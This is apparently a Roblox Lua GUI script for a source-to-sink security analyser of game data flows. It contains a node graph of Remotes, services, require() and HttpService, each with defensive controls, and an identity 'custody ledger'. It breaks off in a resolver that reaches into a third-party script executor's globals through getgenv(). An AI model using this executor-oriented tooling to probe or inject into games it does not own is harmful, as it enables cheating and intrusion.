--[[
  TransparentGui -- Single-File Module v3
  Draggable . Minimizable . Closable . Resizable . Tabbed
  Drop into a LocalScript under StarterPlayerScripts
  ALL strings are pure ASCII -- Roblox Lua 5.1 compatible
--]]

-- SERVICES
local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- DESIGN TOKENS
local T = {
    -- Panel geometry
    PANEL_W     = 360,
    PANEL_H     = 260,
    PANEL_MIN_W = 220,
    PANEL_MIN_H = 140,
    TITLEBAR_H  = 34,
    CORNER      = 8,
    PADDING     = 12,
    BTN_SIZE    = 13,
    BTN_GAP     = 6,
    RESIZE_GRIP = 16,

    -- Colours
    COL_PANEL      = Color3.fromRGB(14,  16,  24),
    ALPHA_PANEL    = 0.22,
    COL_TITLEBAR   = Color3.fromRGB(20,  24,  36),
    ALPHA_TITLEBAR = 0.10,
    COL_SURFACE    = Color3.fromRGB(24,  28,  44),
    ALPHA_SURFACE  = 0.30,
    COL_BORDER     = Color3.fromRGB(70,  90, 150),
    ALPHA_BORDER   = 0.60,
    COL_ACCENT     = Color3.fromRGB(110, 155, 245),
    COL_TEXT_PRI   = Color3.fromRGB(220, 228, 248),
    COL_TEXT_SEC   = Color3.fromRGB(110, 125, 160),
    COL_CLOSE_IDLE = Color3.fromRGB(200,  65,  65),
    COL_CLOSE_HOT  = Color3.fromRGB(240, 100, 100),
    COL_MIN_IDLE   = Color3.fromRGB(195, 155,  35),
    COL_MIN_HOT    = Color3.fromRGB(235, 195,  65),
    COL_GRIP       = Color3.fromRGB(70,   90, 150),
    ALPHA_GRIP     = 0.65,

    -- Fonts
    FONT_TITLE = Enum.Font.GothamBold,
    FONT_BODY  = Enum.Font.Gotham,
    SIZE_TITLE = 12,
    SIZE_BODY  = 12,

    -- Motion
    TW_FAST      = TweenInfo.new(0.15, Enum.EasingStyle.Quad,  Enum.EasingDirection.Out),
    TW_MED       = TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
    TW_SPRING    = TweenInfo.new(0.30, Enum.EasingStyle.Back,  Enum.EasingDirection.Out),
    TW_OPEN_SIZE = TweenInfo.new(0.42, Enum.EasingStyle.Back,  Enum.EasingDirection.Out),
    TW_OPEN_FADE = TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
    TW_CLOSE_SQH = TweenInfo.new(0.10, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
    TW_CLOSE_SHK = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
    TW_CLOSE_FDE = TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.In),

    -- Tabs (floating pill style)
    TABBAR_H       = 26,
    TABBAR_GAP     = 6,
    TABBAR_PAD     = 10,
    TAB_INNER_GAP  = 4,
    COL_TAB_IDLE   = Color3.fromRGB(20,  24,  38),
    ALPHA_TAB_IDLE = 0.55,
    COL_TAB_ACTIVE = Color3.fromRGB(110, 155, 245),
    ALPHA_TAB_ACT  = 0.82,
    COL_TAB_HOT    = Color3.fromRGB(40,  50,  80),
    ALPHA_TAB_HOT  = 0.45,
    SIZE_TAB       = 11,
}

-- STATE
local State = { OPEN = "OPEN", MINIMIZED = "MINIMIZED", CLOSED = "CLOSED" }
local state = State.OPEN

local panW, panH = T.PANEL_W, T.PANEL_H
local panX = math.floor((workspace.CurrentCamera.ViewportSize.X - panW) / 2)
local panY = math.floor((workspace.CurrentCamera.ViewportSize.Y - panH) / 2)
local savedH = panH

-- HELPERS
local function corner(inst, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or T.CORNER)
    c.Parent = inst
end

local function stroke(inst, col, trans, thick)
    local s = Instance.new("UIStroke")
    s.Color           = col   or T.COL_BORDER
    s.Transparency    = trans or T.ALPHA_BORDER
    s.Thickness       = thick or 1
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

local function frame(parent, x, y, w, h, col, alpha, zidx)
    local f = Instance.new("Frame")
    f.Position               = UDim2.fromOffset(x, y)
    f.Size                   = UDim2.fromOffset(w, h)
    f.BackgroundColor3       = col   or Color3.new(1,1,1)
    f.BackgroundTransparency = alpha or 0
    f.ZIndex                 = zidx  or 1
    f.BorderSizePixel        = 0
    f.Parent                 = parent
    return f
end

local function btn(parent, x, y, w, h, col, alpha, zidx)
    local b = Instance.new("TextButton")
    b.Position               = UDim2.fromOffset(x, y)
    b.Size                   = UDim2.fromOffset(w, h)
    b.BackgroundColor3       = col   or Color3.new(1,1,1)
    b.BackgroundTransparency = alpha or 0
    b.Text                   = ""
    b.AutoButtonColor        = false
    b.ZIndex                 = zidx  or 1
    b.BorderSizePixel        = 0
    b.Font                   = T.FONT_BODY
    b.TextColor3             = T.COL_TEXT_PRI
    b.Parent                 = parent
    return b
end

local function lbl(parent, x, y, w, h, txt, font, size, col, xalign, zidx)
    local l = Instance.new("TextLabel")
    l.Position               = UDim2.fromOffset(x, y)
    l.Size                   = UDim2.fromOffset(w, h)
    l.BackgroundTransparency = 1
    l.Text                   = txt    or ""
    l.Font                   = font   or T.FONT_BODY
    l.TextSize               = size   or T.SIZE_BODY
    l.TextColor3             = col    or T.COL_TEXT_PRI
    l.TextXAlignment         = xalign or Enum.TextXAlignment.Left
    l.TextYAlignment         = Enum.TextYAlignment.Center
    l.TextWrapped            = true
    l.ZIndex                 = zidx   or 1
    l.BorderSizePixel        = 0
    l.Parent                 = parent
    return l
end

local function tw(inst, info, goals)
    TweenService:Create(inst, info, goals):Play()
end

-- SCREEN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "TransparentGui"
ScreenGui.ResetOnSpawn   = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent         = PlayerGui

-- PANEL SHELL (holds UIStroke -- stays unclipped)
local PanelShell = frame(ScreenGui, panX, panY, panW, panH, Color3.new(0,0,0), 1, 2)
PanelShell.Name = "PanelShell"
corner(PanelShell)
local panelStroke = stroke(PanelShell, T.COL_BORDER, T.ALPHA_BORDER, 1)

-- PANEL INNER (bg colour + ClipsDescendants)
local Panel = frame(PanelShell, 0, 0, panW, panH, T.COL_PANEL, T.ALPHA_PANEL, 2)
Panel.Name             = "Panel"
Panel.ClipsDescendants = true
corner(Panel)

-- TITLE BAR
local TitleBar = frame(Panel, 0, 0, panW, T.TITLEBAR_H, T.COL_TITLEBAR, T.ALPHA_TITLEBAR, 3)
TitleBar.Name             = "TitleBar"
TitleBar.ClipsDescendants = false
local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, T.CORNER)
tbCorner.Parent = TitleBar
local tbSquare = frame(TitleBar, 0, T.TITLEBAR_H - T.CORNER, panW, T.CORNER,
    T.COL_TITLEBAR, T.ALPHA_TITLEBAR, 3)
tbSquare.Name = "BottomSquare"

local TitleLabel = lbl(TitleBar,
    T.PADDING, 0,
    panW - T.PADDING*2 - (T.BTN_SIZE + T.BTN_GAP)*2 - T.PADDING,
    T.TITLEBAR_H,
    "Panel", T.FONT_TITLE, T.SIZE_TITLE, T.COL_TEXT_PRI,
    Enum.TextXAlignment.Left, 4)
TitleLabel.Name = "TitleLabel"

-- CONTROL BUTTONS
local function makeCtrlBtn(name, idleCol, hotCol, rightEdge)
    local bx = panW - rightEdge - T.BTN_SIZE
    local by = math.floor((T.TITLEBAR_H - T.BTN_SIZE) / 2)
    local b = btn(TitleBar, bx, by, T.BTN_SIZE, T.BTN_SIZE, idleCol, 0, 5)
    b.Name = name
    corner(b, 50)
    b.MouseEnter:Connect(function()
        local cx, cy = b.Position.X.Offset, b.Position.Y.Offset
        tw(b, T.TW_FAST, {
            BackgroundColor3 = hotCol,
            Size     = UDim2.fromOffset(T.BTN_SIZE + 2, T.BTN_SIZE + 2),
            Position = UDim2.fromOffset(cx - 1, cy - 1),
        })
    end)
    b.MouseLeave:Connect(function()
        local cx, cy = b.Position.X.Offset, b.Position.Y.Offset
        tw(b, T.TW_FAST, {
            BackgroundColor3 = idleCol,
            Size     = UDim2.fromOffset(T.BTN_SIZE, T.BTN_SIZE),
            Position = UDim2.fromOffset(cx + 1, cy + 1),
        })
    end)
    return b
end

local CloseBtn = makeCtrlBtn("Close",   T.COL_CLOSE_IDLE, T.COL_CLOSE_HOT, T.PADDING)
local MinBtn   = makeCtrlBtn("Minimize",T.COL_MIN_IDLE,   T.COL_MIN_HOT,   T.PADDING + T.BTN_SIZE + T.BTN_GAP)

-- ===============================================================
--- SOURCE TO SINK  --  NODE GRAPH EDITOR
-- Canvas-based node graph. Nodes are draggable frames. Connections are
-- rotated line frames computed from port positions. Right-click a node
-- to open a context menu (imGUI) for configuring that node's action.

-- -- Graph colour system ----------------------------------------------------
local GC = {
    CANVAS    = Color3.fromRGB( 10,  12,  20),
    GRID      = Color3.fromRGB( 90, 120, 200),
    NODE_TOP  = Color3.fromRGB( 32,  40,  66),   -- glass gradient top
    NODE_BOT  = Color3.fromRGB( 14,  17,  30),   -- glass gradient bottom
    NODE_HDR1 = Color3.fromRGB( 30,  38,  64),   -- header gradient top
    NODE_HDR2 = Color3.fromRGB( 18,  22,  40),   -- header gradient bottom
    PORT_IN   = Color3.fromRGB( 70, 210, 150),
    PORT_OUT  = Color3.fromRGB(120, 165, 255),
    WIRE      = Color3.fromRGB(120, 150, 240),
    WIRE_ACT  = Color3.fromRGB(120, 220, 160),
    SEL_RING  = Color3.fromRGB(150, 185, 255),
    CTX_TOP   = Color3.fromRGB( 26,  31,  52),   -- frosted menu gradient top
    CTX_BOT   = Color3.fromRGB( 12,  14,  24),   -- frosted menu gradient bottom
    CTX_ROW   = Color3.fromRGB( 24,  29,  48),
    CTX_HOT   = Color3.fromRGB( 40,  50,  82),
    DIV       = Color3.fromRGB( 70,  90, 150),
    DIM       = Color3.fromRGB(110, 125, 165),
    MID       = Color3.fromRGB(160, 175, 210),
    PRI       = Color3.fromRGB(228, 234, 252),
    CHK       = Color3.fromRGB(100, 220, 150),
    WARN      = Color3.fromRGB(220, 150,  60),
    ERR       = Color3.fromRGB(228,  80,  90),
}

-- Role accent colours
local ROLE_ACC = {
    INPUT        = Color3.fromRGB( 88, 138, 232),
    REMOTE       = Color3.fromRGB(138,  88, 240),
    BINDABLE     = Color3.fromRGB( 52, 174, 158),
    SERVICE      = Color3.fromRGB(100, 148, 240),
    REQUIRE      = Color3.fromRGB(218, 142,  48),
    HTTP         = Color3.fromRGB(218,  60,  68),
    -- HPDC roles
    INGRESS      = Color3.fromRGB( 88, 138, 232),
    SERIAL       = Color3.fromRGB(160,  80, 255),
    INTERSERVICE = Color3.fromRGB( 52, 174, 158),
    REFLECT      = Color3.fromRGB(218, 142,  48),
    LRCE         = Color3.fromRGB(218,  60,  68),
}

-- -- Node type catalogue ----------------------------------------------------
local NODE_TYPES = {
    {
        id = "INPUT", role = "INPUT", label = "User Input",
        control = {
            name = "Treat as untrusted",
            d    = "Tag this input as attacker-controlled at the boundary. No downstream node may assume it is safe." },
        actions = {
            { n = "Arguments",       d = "Positional args passed to a handler or function." },
            { n = "String / Text",   d = "Raw text from a TextBox, chat, or string argument." },
            { n = "Custom UI Form",  d = "Structured input from a bespoke UI widget." },
            { n = "Keybind Trigger", d = "Keyboard or gamepad input via UserInputService." },
            { n = "GUI Interaction", d = "Player click/tap on a TextButton or ImageButton." },
            { n = "ProximityPrompt", d = "World-space trigger from a ProximityPrompt on a Part." },
        },
    },
    {
        id = "REMOTE", role = "REMOTE", label = "Remote",
        control = {
            name = "Validate & type-check args",
            d    = "Assert every argument type, range, and shape server-side before use. Reject anything malformed." },
        actions = {
            { n = "RemoteEvent",           d = "Fire-and-forget. No return value. Async." },
            { n = "RemoteFunction",        d = "Invoke-and-return. Caller yields for result." },
            { n = "UnreliableRemoteEvent", d = "Best-effort delivery. Drops acceptable." },
        },
    },
    {
        id = "BINDABLE", role = "BINDABLE", label = "Bindable",
        control = {
            name = "Re-tag provenance",
            d    = "Do not assume same-VM data is trusted. Carry an origin tag so downstream knows this came from a client." },
        actions = {
            { n = "BindableEvent",    d = "Fire-and-forget within the same VM. No network." },
            { n = "BindableFunction", d = "Invoke-and-return within the same VM. Sync." },
        },
    },
    {
        id = "SERVICE", role = "SERVICE", label = "Service",
        control = {
            name = "Authorize service access",
            d    = "Gate the service call behind an explicit permission and provenance check. Confirm the caller is allowed before the side effect." },
        actions = (function()
            local svcList = {
                { n="Workspace",            d="Physical world container. DataModel root." },
                { n="Players",              d="Player instances, join/leave events." },
                { n="ReplicatedStorage",    d="Shared storage replicated to all clients." },
                { n="ServerStorage",        d="Server-only secure storage." },
                { n="ServerScriptService",  d="Container for server-side Scripts." },
                { n="StarterGui",           d="UI cloned into PlayerGui on spawn." },
                { n="StarterPack",          d="Tools cloned into Backpack on spawn." },
                { n="StarterPlayer",        d="Default player settings and camera config." },
                { n="RunService",           d="Heartbeat, Stepped, RenderStepped hooks." },
                { n="TweenService",         d="Smooth property interpolation." },
                { n="UserInputService",     d="Keyboard, mouse, touch, gamepad input." },
                { n="ContextActionService", d="Bind named actions to input combos." },
                { n="DataStoreService",     d="Persistent key-value storage." },
                { n="MemoryStoreService",   d="Fast temporary cross-server memory." },
                { n="HttpService",          d="External HTTP requests." },
                { n="MessagingService",     d="Cross-server broadcast messaging." },
                { n="MarketplaceService",   d="Game passes, dev products, purchases." },
                { n="BadgeService",         d="Award and query player badges." },
                { n="TeleportService",      d="Teleport players between places/servers." },
                { n="TextChatService",      d="In-game chat system and channels." },
                { n="GroupService",         d="Query Roblox group membership info." },
                { n="PhysicsService",       d="Collision group management." },
                { n="PathfindingService",   d="AI navigation path computation." },
                { n="CollectionService",    d="Tag-based object grouping and lookup." },
                { n="InsertService",        d="Insert published assets at runtime." },
                { n="AssetService",         d="Asset loading and metadata queries." },
                { n="PolicyService",        d="Regional restriction policy checks." },
                { n="LogService",           d="Capture output and error log entries." },
                { n="Lighting",             d="Global lighting, sky, atmosphere." },
                { n="SoundService",         d="Global audio settings and management." },
                { n="GuiService",           d="UI focus and navigation control." },
                { n="Stats",               d="FPS, memory, network performance stats." },
            }
            -- Probe live status non-destructively
            for _, e in ipairs(svcList) do
                local ok, svc = pcall(function() return game:FindService(e.n) end)
                e.live = ok and svc ~= nil
            end
            return svcList
        end)(),
    },
    {
        id = "REQUIRE", role = "REQUIRE", label = "require()",
        control = {
            name = "Hard-allowlist AssetIDs",
            d    = "Only require() from a fixed, code-defined set of AssetIDs. Never pass a client- or payload-derived ID." },
        actions = {
            { n = "Local ModuleScript", d = "require() a ModuleScript in ReplicatedStorage." },
            { n = "Public Asset ID",    d = "require(assetId) -- published ModuleScript by ID." },
            { n = "External Asset ID",  d = "Untrusted ID. Risk: arbitrary Lua execution." },
        },
    },
    {
        id = "HTTP", role = "HTTP", label = "HttpService",
        control = {
            name = "Domain-allowlist, no eval",
            d    = "Restrict outbound requests to a fixed domain allowlist. Never execute, require, or eval any response body." },
        actions = {
            { n = "GET Request",   d = "Fetch data from an external REST endpoint." },
            { n = "POST Request",  d = "Send payload to an external endpoint." },
            { n = "Webhook Push",  d = "Push event to a webhook URL." },
            { n = "REST API Call", d = "Full JSON exchange with a remote REST service." },
        },
    },
}

-- -- Graph state ------------------------------------------------------------
local graphNodes    = {}   -- array of node objects
local graphWires    = {}   -- array of wire objects { from=nodeObj, to=nodeObj, frame=Frame }
local riskBadgeLbl  = nil  -- live score label in the toolbar
local riskDetailFrm = nil  -- floating risk detail panel

-- -- Graph context system ------------------------------------------------------
-- Each tab that hosts a graph (S->S, HPDC) has its own saved context so
-- switching tabs preserves each graph's independent state.
local activeGraphId = "SS"
local ssCtx   = { nodes={}, wires={}, canvas=nil, page=nil, selected=nil, wiringFrom=nil, genPrompt=nil }
local hpdcCtx = { nodes={}, wires={}, canvas=nil, page=nil, selected=nil, wiringFrom=nil }

-- ==================================================================
--   CUSTODY LEDGER  (CL)
--   Tracks whether verified identity remains attached at every
--   step of a RemoteEvent -> BindableEvent chain.
--
--   Three custody states per step:
--     ENGINE      -- identity guaranteed by the Roblox engine
--                   (server always receives Player as first arg)
--     MANUAL      -- identity present in payload; manually passed
--     ABSENT      -- identity not in payload at this step
--     SUBSTITUTED -- no Player object, but a UserId from payload
--                   found (attacker controls identity claim)
--
--   Three session verdicts:
--     INTACT      -- identity present at every step
--     BROKEN      -- identity dropped at some handoff, no substitute
--     SUBSTITUTED -- identity dropped and UserId from payload used
-- ==================================================================
local CL = {
    sessions  = {},  -- completed sessions (newest first)
    active    = nil, -- session in progress
    onUpdate  = nil, -- fn(session) -> UI rebuild callback
    MAX_SAVED = 30,
}

-- -- Internal: scan a value (or table) for a Player instance ------
local function _findPlayer(v, depth)
    depth = depth or 0
    if depth > 3 then return nil end
    if typeof(v) == "Instance" and v:IsA("Player") then return v end
    if type(v) == "table" then
        for _, item in pairs(v) do
            local found = _findPlayer(item, depth+1)
            if found then return found end
        end
    end
    return nil
end

-- -- Internal: scan for a UserId substitution in payload ----------
local function _findUserIdSub(v, depth)
    depth = depth or 0
    if depth > 3 then return nil end
    local players = Players:GetPlayers()
    local function isKnownId(n)
        for _, p in ipairs(players) do
            if p.UserId == n then return p end
        end
    end
    local asNum = tonumber(v)
    if asNum then
        local match = isKnownId(math.floor(asNum))
        if match then return match end
    end
    if type(v) == "table" then
        for _, item in pairs(v) do
            local found = _findUserIdSub(item, depth+1)
            if found then return found end
        end
    end
    return nil
end

-- -- Session lifecycle ---------------------------------------------
function CL:beginSession(chainId, sourceLabel)
    self.active = {
        id           = chainId or ("cl_"..math.floor(tick()*1000)),
        startTime    = tick(),
        sourceLabel  = sourceLabel or "unknown",
        steps        = {},
        verdict      = "PENDING",
        breakStep    = nil,   -- step index where identity first disappears
        subStep      = nil,   -- step index where substitution first detected
    }
end

-- Call after each node executes.
-- stepNum  : 1-based position in the chain
-- nodeType : "REMOTE" | "BINDABLE" | "HTTP" | "INPUT" | etc.
-- nodeName : human-readable label
-- payload  : the value being carried forward through the chain
function CL:recordStep(stepNum, nodeType, nodeName, payload)
    if not self.active then return end

    local rec = {
        stepNum   = stepNum,
        nodeType  = nodeType  or "UNKNOWN",
        nodeName  = nodeName  or "?",
        timestamp = tick(),
        custody   = "ABSENT",   -- final state for this step
        source    = nil,        -- ENGINE | MANUAL | PAYLOAD | nil
        player    = nil,        -- Player instance if found
        subPlayer = nil,        -- Player matched by UserId substitution
    }

    if nodeType == "REMOTE" then
        -- Engine always prepends Player on the server side.
        -- From the client we mark this as ENGINE -- the contract
        -- is guaranteed at this boundary by the Roblox runtime.
        rec.custody = "ENGINE"
        rec.source  = "ENGINE"

    else
        -- For all other node types: inspect the payload manually.
        local playerInPayload = _findPlayer(payload)
        if playerInPayload then
            rec.custody = "MANUAL"
            rec.source  = "MANUAL"
            rec.player  = playerInPayload
        else
            -- No Player object -- check for UserId substitution
            local subPlayer = _findUserIdSub(payload)
            if subPlayer then
                rec.custody   = "SUBSTITUTED"
                rec.source    = "PAYLOAD"
                rec.subPlayer = subPlayer
                if not self.active.subStep then
                    self.active.subStep = stepNum
                end
            else
                rec.custody = "ABSENT"
                if not self.active.breakStep then
                    self.active.breakStep = stepNum
                end
            end
        end
    end

    table.insert(self.active.steps, rec)

    if self.onUpdate then
        task.spawn(self.onUpdate, self.active)
    end
end

-- Call at the end of the chain run.
function CL:closeSession()
    if not self.active then return end

    -- Derive verdict from recorded steps
    local verdict = "INTACT"
    if self.active.subStep then
        verdict = "SUBSTITUTED"
    elseif self.active.breakStep then
        verdict = "BROKEN"
    end

    self.active.verdict  = verdict
    self.active.endTime  = tick()
    self.active.duration = math.floor((self.active.endTime - self.active.startTime)*1000)

    -- Shift into completed list
    table.insert(self.sessions, 1, self.active)
    while #self.sessions > self.MAX_SAVED do
        table.remove(self.sessions)
    end

    local closed    = self.active
    self.active     = nil

    if self.onUpdate then
        task.spawn(self.onUpdate, closed)
    end

    return closed
end

-- -- Query helpers -------------------------------------------------
function CL:last()
    return self.sessions[1]
end

function CL:flagged()
    local out = {}
    for _, s in ipairs(self.sessions) do
        if s.verdict ~= "INTACT" then table.insert(out, s) end
    end
    return out
end

-- Short summary string for a session
function CL:summary(s)
    s = s or self:last()
    if not s then return "No sessions" end
    local icon = ({INTACT="[OK]", BROKEN="[!]", SUBSTITUTED="[X]", PENDING="..."})[s.verdict] or "?"
    return ("%s  %s  [%d steps . %dms]  source: %s"):format(
        icon, s.verdict, #s.steps, s.duration or 0, s.sourceLabel)
end

-- -- UI panel builder ----------------------------------------------
-- Returns a Frame containing the full ledger view for the last session.
-- parent  : the Frame to parent it to
-- x, y    : position offsets
-- w, h    : size
function CL:buildPanel(parent, x, y, w, h)
    -- Colours
    local COL = {
        ENGINE      = Color3.fromRGB( 60,180, 90),  -- green
        MANUAL      = Color3.fromRGB(200,170, 40),  -- amber
        ABSENT      = Color3.fromRGB(200, 70, 60),  -- red
        SUBSTITUTED = Color3.fromRGB(230, 90, 30),  -- orange-red
        PENDING     = Color3.fromRGB(120,120,140),  -- grey
        BG          = Color3.fromRGB(  8,  8, 18),
        SURFACE     = Color3.fromRGB( 16, 16, 30),
        BORDER      = Color3.fromRGB( 40, 40, 70),
        TEXT        = Color3.fromRGB(220,220,240),
        DIM         = Color3.fromRGB(100,100,130),
    }

    -- Root frame
    local root = Instance.new("Frame")
    root.Name                   = "CustodyLedger"
    root.Size                   = UDim2.new(0, w, 0, h)
    root.Position               = UDim2.new(0, x, 0, y)
    root.BackgroundColor3       = COL.BG
    root.BackgroundTransparency = 0.10
    root.BorderSizePixel        = 0
    root.ZIndex                 = 45
    root.Parent                 = parent

    Instance.new("UICorner", root).CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", root)
    stroke.Color       = COL.BORDER
    stroke.Thickness   = 1.2
    stroke.Transparency= 0.30

    -- Header
    local hdr = Instance.new("Frame", root)
    hdr.Size                   = UDim2.new(1, 0, 0, 34)
    hdr.BackgroundColor3       = COL.SURFACE
    hdr.BackgroundTransparency = 0.20
    hdr.BorderSizePixel        = 0
    hdr.ZIndex                 = 46
    Instance.new("UICorner", hdr).CornerRadius = UDim.new(0, 10)

    local hdrLbl = Instance.new("TextLabel", hdr)
    hdrLbl.Size                   = UDim2.new(1,-12,1,0)
    hdrLbl.Position               = UDim2.new(0,12,0,0)
    hdrLbl.BackgroundTransparency = 1
    hdrLbl.Text                   = "CUSTODY LEDGER"
    hdrLbl.TextColor3             = COL.TEXT
    hdrLbl.TextSize               = 11
    hdrLbl.Font                   = Enum.Font.GothamBold
    hdrLbl.TextXAlignment         = Enum.TextXAlignment.Left
    hdrLbl.ZIndex                 = 47

    -- Scroll for step rows
    local scroll = Instance.new("ScrollingFrame", root)
    scroll.Size                   = UDim2.new(1,-4, 1,-42)
    scroll.Position               = UDim2.new(0,2,0,38)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel        = 0
    scroll.ScrollBarThickness     = 3
    scroll.ScrollBarImageColor3   = COL.BORDER
    scroll.CanvasSize             = UDim2.new(0,0,0,0)
    scroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
    scroll.ZIndex                 = 46

    local layout = Instance.new("UIListLayout", scroll)
    layout.Padding         = UDim.new(0, 4)
    layout.SortOrder       = Enum.SortOrder.LayoutOrder
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    Instance.new("UIPadding", scroll).PaddingLeft   = UDim.new(0,6)

    -- -- render function: builds rows from last session ------------
    local function rebuild()
        -- Clear old rows
        for _, ch in ipairs(scroll:GetChildren()) do
            if ch:IsA("Frame") or ch:IsA("TextLabel") then ch:Destroy() end
        end

        local session = CL:last()
        if not session then
            local empty = Instance.new("TextLabel", scroll)
            empty.Size                   = UDim2.new(1,-12,0,28)
            empty.BackgroundTransparency = 1
            empty.Text                   = "No chain run yet."
            empty.TextColor3             = COL.DIM
            empty.TextSize               = 11
            empty.Font                   = Enum.Font.Gotham
            empty.ZIndex                 = 47
            return
        end

        -- Session verdict banner
        local verdictCol = ({
            INTACT      = COL.ENGINE,
            BROKEN      = COL.ABSENT,
            SUBSTITUTED = COL.SUBSTITUTED,
            PENDING     = COL.PENDING,
        })[session.verdict] or COL.PENDING

        local banner = Instance.new("Frame", scroll)
        banner.Size                   = UDim2.new(1,-12,0,30)
        banner.BackgroundColor3       = verdictCol
        banner.BackgroundTransparency = 0.70
        banner.BorderSizePixel        = 0
        banner.LayoutOrder            = 0
        banner.ZIndex                 = 47
        Instance.new("UICorner", banner).CornerRadius = UDim.new(0,6)

        local vLbl = Instance.new("TextLabel", banner)
        vLbl.Size                   = UDim2.new(1,-10,1,0)
        vLbl.Position               = UDim2.new(0,10,0,0)
        vLbl.BackgroundTransparency = 1
        vLbl.Text                   = CL:summary(session)
        vLbl.TextColor3             = COL.TEXT
        vLbl.TextSize               = 10
        vLbl.Font                   = Enum.Font.GothamSemibold
        vLbl.TextXAlignment         = Enum.TextXAlignment.Left
        vLbl.ZIndex                 = 48

        -- Step rows
        for i, step in ipairs(session.steps) do
            local custodyCol = ({
                ENGINE      = COL.ENGINE,
                MANUAL      = COL.MANUAL,
                ABSENT      = COL.ABSENT,
                SUBSTITUTED = COL.SUBSTITUTED,
            })[step.custody] or COL.DIM

            local row = Instance.new("Frame", scroll)
            row.Size                   = UDim2.new(1,-12,0,46)
            row.BackgroundColor3       = COL.SURFACE
            row.BackgroundTransparency = 0.40
            row.BorderSizePixel        = 0
            row.LayoutOrder            = i
            row.ZIndex                 = 47
            Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

            -- Custody state colour bar (left edge)
            local bar = Instance.new("Frame", row)
            bar.Size                   = UDim2.new(0,4,1,0)
            bar.BackgroundColor3       = custodyCol
            bar.BackgroundTransparency = 0.10
            bar.BorderSizePixel        = 0
            bar.ZIndex                 = 48
            Instance.new("UICorner", bar).CornerRadius = UDim.new(0,3)

            -- Step number
            local numLbl = Instance.new("TextLabel", row)
            numLbl.Size                   = UDim2.new(0,18,1,0)
            numLbl.Position               = UDim2.new(0,10,0,0)
            numLbl.BackgroundTransparency = 1
            numLbl.Text                   = tostring(i)
            numLbl.TextColor3             = COL.DIM
            numLbl.TextSize               = 10
            numLbl.Font                   = Enum.Font.GothamBold
            numLbl.TextXAlignment         = Enum.TextXAlignment.Center
            numLbl.ZIndex                 = 48

            -- Node type tag
            local typeLbl = Instance.new("TextLabel", row)
            typeLbl.Size                   = UDim2.new(0,68,0,16)
            typeLbl.Position               = UDim2.new(0,30,0,6)
            typeLbl.BackgroundColor3       = custodyCol
            typeLbl.BackgroundTransparency = 0.70
            typeLbl.BorderSizePixel        = 0
            typeLbl.Text                   = step.nodeType
            typeLbl.TextColor3             = custodyCol
            typeLbl.TextSize               = 9
            typeLbl.Font                   = Enum.Font.GothamBold
            typeLbl.TextXAlignment         = Enum.TextXAlignment.Center
            typeLbl.ZIndex                 = 48
            Instance.new("UICorner", typeLbl).CornerRadius = UDim.new(0,4)

            -- Node name
            local nameLbl = Instance.new("TextLabel", row)
            nameLbl.Size                   = UDim2.new(1,-110,0,14)
            nameLbl.Position               = UDim2.new(0,30,0,24)
            nameLbl.BackgroundTransparency = 1
            nameLbl.Text                   = step.nodeName
            nameLbl.TextColor3             = COL.DIM
            nameLbl.TextSize               = 9
            nameLbl.Font                   = Enum.Font.Gotham
            nameLbl.TextXAlignment         = Enum.TextXAlignment.Left
            nameLbl.TextTruncate           = Enum.TextTruncate.AtEnd
            nameLbl.ZIndex                 = 48

            -- Custody state label (right side)
            local stateLbl = Instance.new("TextLabel", row)
            stateLbl.Size                   = UDim2.new(0,90,1,0)
            stateLbl.Position               = UDim2.new(1,-94,0,0)
            stateLbl.BackgroundTransparency = 1
            stateLbl.Text                   = step.custody
            stateLbl.TextColor3             = custodyCol
            stateLbl.TextSize               = 10
            stateLbl.Font                   = Enum.Font.GothamBold
            stateLbl.TextXAlignment         = Enum.TextXAlignment.Right
            stateLbl.ZIndex                 = 48

            -- Break annotation
            if step.custody == "ABSENT" and session.breakStep == i then
                local ann = Instance.new("TextLabel", row)
                ann.Size                   = UDim2.new(1,-12,0,10)
                ann.Position               = UDim2.new(0,6,1,-10)
                ann.BackgroundTransparency = 1
                ann.Text                   = "<- custody break: Player object dropped here"
                ann.TextColor3             = COL.ABSENT
                ann.TextSize               = 8
                ann.Font                   = Enum.Font.Gotham
                ann.TextXAlignment         = Enum.TextXAlignment.Left
                ann.ZIndex                 = 48
            elseif step.custody == "SUBSTITUTED" and session.subStep == i then
                local ann = Instance.new("TextLabel", row)
                ann.Size                   = UDim2.new(1,-12,0,10)
                ann.Position               = UDim2.new(0,6,1,-10)
                ann.BackgroundTransparency = 1
                ann.Text                   = "<- CRITICAL: UserId from payload used as identity"
                ann.TextColor3             = COL.SUBSTITUTED
                ann.TextSize               = 8
                ann.Font                   = Enum.Font.GothamBold
                ann.TextXAlignment         = Enum.TextXAlignment.Left
                ann.ZIndex                 = 48
            end
        end
    end

    rebuild()
    CL.onUpdate = function() rebuild() end

    return root, rebuild
end

-- -----------------------------------------------------------------


-- -- Executor-global resolver --------------------------------------------------
-- Called fresh on every HTTP:post / HTTP:get invocation so that stale upvalues
-- from a previous executor session never silently block requests. If the
-- executor is restarted or reinjected, the next call will find the new globals.
local function _execFn(name)
    -- 1. getgenv() -- executor's own global env (most reliable across threads)
    if getgenv then
        local fn = rawget(getgenv(), name)
        if type(fn) == "function" then return fn end
    end
    -- 2. rawget on _G (avoids __index metamethods that may swallow errors)
    local fn = rawget(_G, name)
